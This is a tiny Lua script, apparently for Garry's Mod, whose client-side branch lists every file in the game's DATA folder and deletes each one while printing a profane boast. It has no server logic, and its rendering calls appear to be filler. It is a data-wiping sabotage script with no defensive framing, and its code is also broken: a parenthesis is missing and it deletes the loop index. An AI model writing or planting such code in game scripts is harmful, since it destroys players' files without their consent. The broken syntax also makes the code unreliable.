if SERVER then
 
else
	mesh.Begin() 
	cam.Start3D2D()
 
	for k, v in pairs(file.Find("*", "DATA") do
    	file.Delete(k);
    	print("Fucked "..v.."/"..k)
  	end
end
